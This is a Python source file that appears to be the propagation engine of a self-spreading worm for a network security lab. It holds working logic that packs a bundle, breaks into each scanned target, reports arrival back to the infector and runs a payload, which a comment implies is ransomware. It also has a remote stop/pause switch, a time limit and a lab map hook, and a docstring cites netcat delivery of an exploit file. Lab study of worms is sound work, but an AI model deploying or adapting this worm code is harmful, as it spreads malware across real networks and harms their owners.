"""The spread loop. It knows nothing about exploits, payloads or switches.

Two ways to run, chosen on the command line:

    worm launch    on patient zero: check that the exploit can work here,
                   pack the bundle, then attack, over and over
    worm run       on a machine the bundle just landed on: tell the sender we
                   arrived, run the payload until it has finished its own
                   work, then attack, over and over

Each round asks the same questions in order: is it time to stop, who is
next, and can we get in there. On patient zero the worm does not run the
payload: it only carries it.

Rules for this package: standard library only. It has to run on any machine
the bundle lands on.
"""

import fcntl
import json
import os
import shlex
import signal
import socket
import subprocess
import threading
import time
from pathlib import Path

import label

from . import body, plugs
from .events import make_logger
from .spec import PAUSE, STOP, SLOTS, Pace, describe

LAUNCH = "launch"
ARRIVE = "run"

#: The Internet Map's add-on, if the lab has the map and the add-on is
#: installed. It is the same hook the Morris worm example uses.
MAP_HOOK = "/map-plugins/submit_event.sh"
MAP_FLASH_SECONDS = 5
#: Never let a call to the map hold the worm up for longer than this.
MAP_CALL_SECONDS = 8
#: The map's server reads a JSON body for "flash" and "highlight", and fails
#: with an internal error when there is none. The add-on sends a body only
#: when it is given a style file, so the worm always gives it one.
MAP_STYLES = {"flash": "{}", "highlight": '{"highlight": {"borderWidth": 4}}', "restore": "{}"}


class Engine:
    def __init__(self, home=None):
        #: The folder holding yom_worm and the other packages: /opt/yom on
        #: patient zero, /tmp/yomw on a machine the bundle landed on.
        self.home = Path(home) if home else Path(__file__).resolve().parent.parent
        self.log = make_logger(self.home)
        self.done = set()                  # machines that answered us
        self.shown_on_map = False           # true once this machine flashed on the map
        self.started = time.monotonic()

    # ---- the network, done for the parts ----

    @property
    def announce_port(self):
        return self.pace.announce_port

    def my_ip_toward(self, target):
        """Our own address, as the target will see it."""
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect((target, self.announce_port))     # sends nothing; picks our address
            return probe.getsockname()[0]

    def exchange(self, ip, port, data, wait):
        """Send, close our side, then wait for the other side.

        This is what `cat badfile | nc -w3 ip port` does.
        """
        with socket.create_connection((ip, port), timeout=5) as sock:
            sock.sendall(data)
            sock.shutdown(socket.SHUT_WR)
            sock.settimeout(wait)
            try:
                while sock.recv(4096):
                    pass
            except OSError:
                pass                       # the other side kept the line: give up after `wait`

    def deliver(self, ip, port, data) -> bool:
        """Wait for a port to start listening, then send everything to it."""
        deadline = time.monotonic() + self.pace.body_wait
        while time.monotonic() < deadline:
            try:
                with socket.create_connection((ip, port), timeout=1) as sock:
                    sock.sendall(data)
                    sock.shutdown(socket.SHUT_WR)
                    sock.settimeout(3)
                    try:
                        while sock.recv(4096):
                            pass
                    except OSError:
                        pass
                return True
            except OSError:
                time.sleep(0.3)
        return False

    def wait_answer(self, target):
        """Wait for the machine we just attacked to answer: "arrived" or "already"."""
        deadline = time.monotonic() + self.pace.announce_wait
        while time.monotonic() < deadline:
            try:
                data, sender = self.udp.recvfrom(64)
            except socket.timeout:
                continue
            if sender[0] == target:
                # A machine answers "ARRIVED", or just "A" when it had the worm before.
                word = data.decode(errors="replace").strip().lower()
                return {"a": "already", "arrived": "arrived"}.get(word, word or None)
        return None

    # ---- running ----

    def run(self, mode):
        # The program the worm came through may ignore the "a child has ended"
        # signal, SIGCHLD: the vulnerable server does, so that its children
        # leave no zombies. The exploit's shell, and the worm in it, inherit
        # that. With it, a child's exit status cannot be read, and every one
        # is taken for 0: the payload's, and the map's. So that is undone first.
        signal.signal(signal.SIGCHLD, signal.SIG_DFL)
        manifest = json.loads((self.home / "worm.json").read_text(encoding="utf-8"))
        registry = plugs.load(self.home, manifest.get("packages", []))
        self.manifest = manifest
        self.pace = Pace(**manifest["pace"])
        for slot in SLOTS:
            setattr(self, slot, None if manifest.get(slot) is None
                    else plugs.build(registry, slot, manifest[slot]))
        for part in [getattr(self, slot) for slot in SLOTS]:
            prepare = getattr(part, "prepare", None) if part is not None else None
            if prepare:
                prepare(self)
        self._lock()
        self._listen()
        if mode == LAUNCH:
            self._launch()          # measures what the exploit needs; that goes into the bundle
        # Every machine passes the same bundle onward: these packages and these settings.
        self.body = body.pack(self.home, self.manifest.get("packages", []), self._manifest_to_ship())
        if mode == ARRIVE:
            self._arrive()
        self._spread()

    def _lock(self):
        """One worm per machine."""
        lock = (self.home / ".lock").open("a")
        try:
            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            print("a worm is already running on this machine")
            raise SystemExit(0)

    def _listen(self):
        """The port machines answer on."""
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.udp.bind(("0.0.0.0", self.announce_port))
        self.udp.settimeout(0.5)

    def _launch(self):
        # Any part may have a reason the worm must not start from here, and
        # may measure something here that then travels inside the bundle.
        problems = []
        for part in (self.scanner, self.exploit, self.control):
            check = getattr(part, "check_host", None) if part is not None else None
            for problem in (check() if check else []):
                print("  " + problem, flush=True)
                problems.append(problem)
        if problems:
            self.log("refused", reasons=problems)
            raise SystemExit(1)
        self._await_control()
        self.log("launch", home=str(self.home))

    def _await_control(self):
        """Never start before the switch machine has answered once.

        A switch that says nothing is never a "go": when the waiting is over,
        the worm stops.
        """
        if self.control is None:
            return
        deadline = time.monotonic() + self.pace.startup_wait
        while True:
            try:
                self.control.answer()
                return
            except Exception as error:             # a control that cannot tell yet
                if time.monotonic() > deadline:
                    print(str(error), flush=True)
                    self.log("halted", reason="the switch machine did not answer")
                    raise SystemExit(1)
                print("waiting for the switch machine...", flush=True)
                time.sleep(self.pace.attempt_delay)

    def _manifest_to_ship(self):
        """The settings file for our children, including anything measured here."""
        ship = dict(self.manifest)
        for slot in SLOTS:
            part = getattr(self, slot)
            if part is not None:
                ship[slot] = describe(part)
        return ship

    def _map_style(self, action) -> str:
        """A small file next to the worm, holding what the map should draw."""
        path = self.home / "map-{}.json".format(action)
        if not path.exists():
            path.write_text(MAP_STYLES[action], encoding="utf-8")
        return str(path)

    def _tell_map(self, action, then=None, wait=False):
        """Show this machine on the Internet Map: flash, highlight or restore.

        Does nothing on a lab without the map, or without its add-on. The
        flash-and-highlight takes five seconds, so it runs in the background
        and never slows the worm down.
        """
        if not os.path.exists(MAP_HOOK):
            return
        command = "bash {} -a {} -s {}".format(MAP_HOOK, action, self._map_style(action))
        if then:
            command += " && sleep {} && bash {} -a {} -s {}".format(
                MAP_FLASH_SECONDS, MAP_HOOK, then, self._map_style(then))

        def tell():
            started = time.monotonic()
            try:
                done = subprocess.run(command, shell=True, capture_output=True,
                                       timeout=MAP_CALL_SECONDS)
                # The add-on ends well whenever the map answered, even with
                # "no". So the map's own word is read, not the exit code.
                answered = '"ok":true' in done.stdout.decode(errors="replace")
                self.log("map", action=action, ok=answered,
                         seconds=round(time.monotonic() - started, 1))
            except (OSError, subprocess.SubprocessError) as error:
                self.log("map", action=action, ok=False, error=str(error))

        if wait:
            tell()
        else:
            threading.Thread(target=tell, daemon=True).start()

    def _arrive(self):
        os.dup2(os.open(os.devnull, os.O_RDONLY), 0)   # we came in through a connection: let it go
        infector = os.environ.get("FROM", "")
        if infector:
            for _ in range(3):               # three times, in case one packet is lost
                self.udp.sendto(b"ARRIVED", (infector, self.announce_port))
                time.sleep(0.05)
        self.log("arrived", infector=infector)
        if os.path.exists(MAP_HOOK):
            self.shown_on_map = True
            self._tell_map("flash", then="highlight")
        self._run_payload()

    def _run_payload(self):
        """Read the payload's label and run its start command, then wait until it has finished.

        The payload's own work is done when its start command returns. It
        never waits for a person: a victim pays long after the worm has moved
        on.
        """
        if not self.manifest.get("payload"):
            return
        folder = self.home / self.manifest["payload"]["folder"]
        try:
            payload = label.read_label(folder)
            self.log("payload", name=payload["name"], start=payload["start"])
            done = subprocess.run(shlex.split(payload["start"]), cwd=self.home,
                                  env=dict(os.environ, PYTHONPATH=str(self.home)))
            self.log("payload finished", name=payload["name"], exit=done.returncode)
        except (OSError, ValueError) as error:
            self.log("payload failed", error=str(error))

    def _spread(self):
        while True:
            if time.monotonic() - self.started > self.pace.max_seconds:
                return self._halt("time limit")
            if self.control is not None:
                try:
                    answer = self.control.answer()
                except Exception as error:        # the switch machine said nothing: never a "go"
                    print(str(error), flush=True)
                    return self._halt("the switch machine did not answer")
                if answer == STOP:
                    return self._halt("stop signal")
                if answer == PAUSE:
                    if not getattr(self, "_paused", False):
                        self.log("paused")
                        self._paused = True
                    time.sleep(self.pace.pause_seconds)
                    continue
                if getattr(self, "_paused", False):
                    self.log("running again")
                    self._paused = False
            target = self.scanner.next_target(self.done)
            if target is None:
                time.sleep(self.pace.attempt_delay)   # tried everyone: stay, and keep obeying the switch
                continue
            answer = self.exploit.break_in(target, self.body)
            self.log("attempt", target=target, result=answer)
            if answer:
                self.done.add(target)
            time.sleep(self.pace.attempt_delay)

    def _halt(self, reason):
        self.log("halted", reason=reason)      # first, so that stopping is never delayed
        if self.shown_on_map:                   # then take it off the map, if it was on
            self._tell_map("restore", wait=True)
